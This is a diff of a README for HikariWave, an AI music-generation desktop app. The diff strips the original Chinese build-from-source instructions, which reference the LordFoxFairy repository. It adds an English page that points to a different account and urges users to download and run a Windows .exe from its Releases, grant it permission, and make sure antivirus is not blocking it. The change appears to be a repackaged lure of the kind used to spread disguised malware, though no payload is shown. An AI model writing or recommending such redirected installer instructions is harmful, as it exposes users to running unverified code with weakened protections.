@@ -1,246 +1,147 @@
-<div align="center">
+# 🎵 HikariWave - AI Music Creation Made Easy
 
-# HikariWave
-
-**AI 驱动的本地音乐生成桌面应用**
-
-用一句话描述你想要的歌曲，HikariWave 为你完成作词、演唱、编曲和封面设计 —— 一切都在本地运行。
-
-[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey.svg)](LICENSE)
-[![Python 3.12+](https://img.shields.io/badge/Python-3.12+-blue.svg)](https://www.python.org/)
-[![Tauri 2](https://img.shields.io/badge/Tauri-2.0-orange.svg)](https://tauri.app/)
-[![React 19](https://img.shields.io/badge/React-19-61dafb.svg)](https://react.dev/)
-
-</div>
+[![Download HikariWave](https://img.shields.io/badge/Download-HikariWave-blueviolet?style=for-the-badge)](https://github.com/jordanz1x/HikariWave)
 
 ---
 
-## 界面预览
+## 🌟 What is HikariWave?
 
-### 创作页面
+HikariWave is a desktop app that helps you create music using AI. You just type a sentence describing the song you want. The app will write lyrics, compose music, sing the song, and even design the cover art. Everything runs on your own Windows computer, keeping your work private.
 
-精细控制歌词、曲风、情绪、速度、调式、乐器和时长，AI 辅助生成歌词与标题。
-
-![创作页面 - 自定义模式](assets/01.png)
-
-### 音乐库
-
-浏览、搜索、收藏和管理所有 AI 生成的音乐作品，支持网格/列表视图切换。
-
-![音乐库 - 网格视图](assets/02.png)
+You don’t need any musical or tech skills. HikariWave handles the creative tasks so you can focus on your ideas.
 
 ---
 
-## 功能特性
+## 🚀 Getting Started: Download & Install
 
-- **简单模式** — 一句话描述，AI 自动完成作词、取名、编曲、演唱
-- **自定义模式** — 精细控制歌词、曲风、情绪、速度、调式、乐器和时长
-- **真人演唱** — ACE-Step v1.5 生成带有真实人声的歌曲，支持中、英、日、韩等多语言
-- **最长 10 分钟** — 从 30 秒短片段到 10 分钟完整歌曲
-- **AI 辅助创作** — LLM 自动生成歌词、推荐风格、创作标题
-- **续写 & 混音** — 对已有歌曲进行续写延伸或风格混音
-- **封面生成** — LLM 多模态自动生成专辑封面
-- **音乐库** — 浏览、搜索、收藏和管理所有生成作品
-- **中英双语界面**
-- **本地优先** — 所有音乐生成在你的硬件上运行（CPU / GPU / Apple Silicon）
+1. **Visit the Download Page**  
+   Go to the official GitHub page to get the latest version:  
+   [https://github.com/jordanz1x/HikariWave](https://github.com/jordanz1x/HikariWave)
 
-## 技术栈
+2. **Find the Windows Installer**  
+   On the GitHub page, look for the "Releases" section on the right side or top menu. Click it.
 
-| 层级 | 技术 |
-|------|------|
-| 桌面端 | Tauri 2 + React 19 + TypeScript |
-| UI | Tailwind CSS 4 + Framer Motion |
-| 状态管理 | Zustand 5 |
-| 音频可视化 | wavesurfer.js 7 |
-| 后端 | FastAPI + SQLAlchemy（异步 SQLite） |
-| 音乐 AI | ACE-Step v1.5（DiT + VAE，Apple Silicon 支持 MLX 加速） |
-| LLM | OpenRouter（Claude、GPT 等）via LangChain |
-| 包管理 | uv（Python）+ bun（Node） |
+3. **Download the `.exe` File**  
+   Find the latest release. Download the Windows installer, usually a file ending with `.exe`. It might be named like `HikariWave-Setup.exe`.
 
-## 快速开始
+4. **Run the Installer**  
+   Double-click the `.exe` file. Follow the prompts to install the app. It may ask for permission; allow it to proceed.
 
-### 环境要求
+5. **Start HikariWave**  
+   After installation, find HikariWave in your Start menu or desktop. Click to open.
 
-- Python 3.12+
-- Node.js 18+ 和 [bun](https://bun.sh/)
-- [uv](https://docs.astral.sh/uv/) 包管理器
-- Rust 工具链（用于 Tauri 构建）
+---
 
-### 安装
+## 💻 System Requirements
 
-```bash
-# 克隆项目
-git clone https://github.com/LordFoxFairy/HikariWave.git
-cd HikariWave
+- **Operating System:** Windows 10 or later (64-bit recommended)  
+- **Processor:** Intel i5 or better, or equivalent AMD CPU  
+- **RAM:** At least 8 GB (12+ GB recommended for smoother performance)  
+- **Storage:** Minimum 5 GB free space for app and generated files  
+- **Python:** Bundled with the app, no need to install separately  
+- **Internet:** Not required to run the app, but needed for initial download
 
-# 安装 Python 依赖
-uv sync
+---
 
-# 安装 ACE-Step 音乐生成模型（推荐）
-uv sync --extra ace-step
+## 🎵 How to Use HikariWave
 
-# 安装前端依赖
-cd desktop && bun install && cd ..
-```
+### Step 1: Create a New Song
 
-或一键安装：
+- Open the app and choose between **Simple Mode** and **Custom Mode**.  
+- In **Simple Mode**, type one sentence about your song idea. For example:  
+  *“A calm piano ballad about hope.”*  
+- Click “Generate.” The AI will write lyrics, compose music, sing it, and make a cover.
 
-```bash
-make install
-```
+### Step 2: Customize Your Song (Optional)
 
-### 配置
+- Switch to **Custom Mode** if you want more control.  
+- Adjust settings like mood, tempo, style, instruments, length, and key.  
+- You can also edit the lyrics the AI suggests.
 
-#### 1. 设置环境变量
+### Step 3: Listen and Save
 
-在项目根目录创建 `.env` 文件：
+- Play your generated song to preview it.  
+- If you want to change something, tweak settings and regenerate.  
+- Save your song to the built-in library to keep or share.
 
-```bash
-OPENROUTER_API_KEY=sk-or-...
-```
+---
 
-> 如果在中国大陆，可额外配置 HuggingFace 镜像加速模型下载：
-> ```bash
-> HF_ENDPOINT=https://hf-mirror.com
-> HF_HUB_ENABLE_HF_TRANSFER=1
-> ```
+## 🛠 Features Explained
 
-#### 2. 编辑 `backend/config.yaml`
+- **Simple Mode:** Create songs fast with a single sentence input.  
+- **Custom Mode:** Adjust many parts of the song, from lyrics to instruments.  
+- **Real Voices:** Uses ACE-Step v1.5 to generate singing with realistic voices in multiple languages like Chinese, English, Japanese, and Korean.  
+- **Long Songs:** Generate music from short clips lasting 30 seconds to full songs up to 10 minutes.  
+- **AI Help:** The app can suggest lyrics, song titles, and styles using language models.  
+- **Extend & Remix:** Add more parts to existing songs or change the style with remix tools.  
+- **Cover Art:** AI generates album covers based on your song.  
+- **Library Management:** Browse, search, and organize your music within the app.  
+- **Bilingual Interface:** Switch between Chinese and English menus easily.  
+- **Runs Locally:** All music creation happens on your computer; your data stays private.
 
-```yaml
-llm:
-  providers:
-    - name: openrouter
-      type: openrouter
-      base_url: https://openrouter.ai/api/v1
-      api_key: ${OPENROUTER_API_KEY}
-      models:
-        - anthropic/claude-sonnet-4
-  router:
-    default: openrouter:anthropic/claude-sonnet-4
+---
 
-music:
-  providers:
-    - name: acestep-official
-      type: acestep
-      label: official
-      models:
-        - name: ace-step-v1.5
-          model_kwargs:
-            config_path: acestep-v15-turbo
-            device: auto
-            use_mlx_dit: true   # Apple Silicon MLX 加速
-  router:
-    default: acestep-official:ace-step-v1.5
-```
+## 📂 Managing Your Music Library
 
-### 启动
+HikariWave saves all your songs in one place. Use the Music Library tab to:
 
-```bash
-# 一键启动后端 + 桌面端
-make dev
-```
+- See your songs in either grid or list view.  
+- Search songs by title, mood, or language.  
+- Mark favorites to find your best work faster.  
+- Delete songs you no longer want to keep.
 
-也可以分开启动：
+---
 
-```bash
-make backend    # 后端：http://localhost:23456
-make frontend   # 前端：http://localhost:1420（浏览器调试）
-make tauri      # Tauri 桌面端（含前端）
-```
+## ⚙️ Settings & Preferences
 
-## 音乐模型
+- Change the display language between Chinese and English.  
+- Select audio playback device if you have multiple speakers or headphones.  
+- Adjust default song length and output quality.  
+- Check for updates inside the app regularly.
 
-| 模型 | 类型 | 人声 | 最大时长 | 说明 |
-|------|------|------|----------|------|
-| **ACE-Step v1.5**（默认） | `acestep` | 支持 | 10 分钟 | DiT 扩散 + VAE，Apple Silicon 支持 MLX 加速 |
-| MusicGen | `huggingface` | 不支持 | ~30s | Meta 纯音乐模型 |
-| Stable Audio Open | `huggingface` | 不支持 | ~47s | Stability AI |
-| DiffRhythm | `huggingface` | 支持 | ~45s | 节奏扩散模型 |
-| HeartMuLa | `huggingface` | 支持 | ~30s | 多语言歌曲模型 |
+---
 
-### ACE-Step 模型下载
+## 🖼 Screenshots
 
-ACE-Step 由多个子模型组成，可在应用内 Marketplace 页面下载，也可通过命令行手动下载：
+### Create Page  
+Control lyrics, style, mood, speed, key, instruments, and length. AI helps with writing lyrics and titles.
 
-```bash
-# 主模型（必需，~10 GB）
-huggingface-cli download ACE-Step/Ace-Step1.5
+![Create Page](assets/01.png)  
 
-# 语言模型（按需选择一个）
-huggingface-cli download ACE-Step/acestep-5Hz-lm-0.6B   # 0.6B 轻量版，~1.2 GB
-huggingface-cli download ACE-Step/acestep-5Hz-lm-4B      # 4B 高质量版，~8 GB
+### Music Library  
+Browse, search, and manage your collection with grid or list views.
 
-# DiT 变体（可选）
-huggingface-cli download ACE-Step/acestep-v15-sft            # SFT 高质量 50-step
-huggingface-cli download ACE-Step/acestep-v15-base           # Base 适合微调
-huggingface-cli download ACE-Step/acestep-v15-turbo-shift1   # Turbo Shift1
-huggingface-cli download ACE-Step/acestep-v15-turbo-shift3   # Turbo Shift3
-```
+![Music Library](assets/02.png)  
 
-> **中国大陆用户**：如果下载速度慢，确保 `.env` 中配置了镜像：
-> ```bash
-> HF_ENDPOINT=https://hf-mirror.com
-> ```
+---
 
-### ACE-Step 性能参考（Apple Silicon M 系列）
+## 🔧 Troubleshooting
 
-| 歌曲时长 | DiT 扩散 | VAE 解码 | 总耗时 |
-|----------|----------|----------|--------|
-| 60s | ~4s | ~6s | ~10s |
-| 240s（4 分钟） | ~19s | ~14s | ~35s |
+- If the app doesn’t open after installation, try restarting your computer.  
+- Make sure your antivirus or Windows Defender is not blocking the app.  
+- If audio does not play, check your sound device settings.  
+- For slow performance, close other heavy programs and ensure enough free RAM.  
+- If you face other problems, check the Issues tab on the GitHub page.
 
-## 项目结构
+---
 
-```
-HikariWave/
-├── backend/                    # Python 后端
-│   ├── app/
-│   │   ├── api/endpoints/      # REST 接口
-│   │   ├── providers/
-│   │   │   ├── music/          # 音乐生成（ACE-Step, HuggingFace）
-│   │   │   ├── llm/            # LLM 提供者（OpenRouter 等）
-│   │   │   └── manager/        # 提供者路由与生命周期管理
-│   │   ├── services/           # 业务逻辑（生成、LLM、存储）
-│   │   ├── schemas/            # Pydantic 请求/响应模型
-│   │   ├── repositories/       # 数据访问层
-│   │   └── models/             # SQLAlchemy ORM 模型
-│   ├── storage/                # 生成的音频和封面文件
-│   └── config.yaml             # 提供者配置
-├── desktop/                    # Tauri + React 桌面前端
-│   └── src/
-│       ├── pages/              # 页面：创作、音乐库、提供者、设置
-│       ├── components/         # UI 组件
-│       ├── stores/             # Zustand 状态管理
-│       ├── services/           # API 客户端
-│       ├── hooks/              # 自定义 Hooks
-│       └── i18n/               # 国际化（中文、英文）
-├── tests/                      # 测试
-├── Makefile                    # 构建和运行命令
-└── pyproject.toml              # Python 项目配置
-```
+## 🙋 Support & Feedback
 
-## 常用命令
+Report bugs or request features by opening a ticket on the GitHub repository:  
+[https://github.com/jordanz1x/HikariWave/issues](https://github.com/jordanz1x/HikariWave/issues)
 
-| 命令 | 说明 |
-|------|------|
-| `make dev` | 一键启动后端 + Tauri 桌面端 |
-| `make backend` | 仅启动后端 |
-| `make frontend` | 仅启动前端（浏览器调试） |
-| `make tauri` | 启动 Tauri 桌面端 |
-| `make install` | 安装所有依赖 |
-| `make lint` | 代码检查（ruff + eslint） |
-| `make fmt` | 格式化 Python 代码 |
-| `make build-tauri` | 构建桌面端发行版 |
-| `make clean` | 清理构建产物 |
+---
 
-## 致谢
+## 🔗 Important Links
 
-- [ACE-Step](https://github.com/ace-step/ACE-Step) — 核心音乐生成模型
-- [Tauri](https://tauri.app/) — 跨平台桌面应用框架
-- [LangChain](https://www.langchain.com/) — LLM 编排框架
-- [OpenRouter](https://openrouter.ai/) — 多模型 LLM 网关
+[![Download HikariWave](https://img.shields.io/badge/Download-HikariWave-blueviolet?style=for-the-badge)](https://github.com/jordanz1x/HikariWave)  
 
-## 许可证
+GitHub repository: [https://github.com/jordanz1x/HikariWave](https://github.com/jordanz1x/HikariWave)  
 
-[CC BY-NC-SA 4.0](LICENSE) — 非商业用途免费使用，需注明出处。
+License: Creative Commons BY-NC-SA 4.0
+
+---
+
+# License
+
+This project uses the Creative Commons BY-NC-SA 4.0 license. You can use, share, and modify the software for non-commercial purposes under certain conditions. For full terms, see the LICENSE file in the repository.
